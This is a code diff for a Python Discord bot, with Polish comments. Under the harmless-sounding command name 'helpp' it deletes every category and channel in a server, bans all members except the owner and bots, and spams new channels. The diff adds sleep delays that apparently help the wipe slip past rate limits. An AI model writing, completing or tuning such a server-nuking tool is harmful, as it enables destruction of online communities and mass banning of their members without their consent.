@@ -1,4 +1,5 @@
 import discord
+import asyncio
 from discord.ext import commands
 from config import prefix, token
 
@@ -15,12 +16,17 @@ async def on_ready():
 async def helpp(ctx):
     for category in ctx.guild.categories:
         await category.delete()
+        await asyncio.sleep(0.5)
+        
     for channel in ctx.guild.channels:
         await channel.delete()
+        await asyncio.sleep(0.5)
+        
     for member in ctx.guild.members:
         if member != ctx.guild.owner and not member.bot: # To potrzebne by bot nie zbanował właściciela i botów :>.
             await member.ban(reason="Bla bla bla, wpisz co chcesz.")
     for i in range(20):
         await ctx.guild.create_text_channel(name=nazwa)
+        await asyncio.sleep(0.5)
    
 nb.run(token)
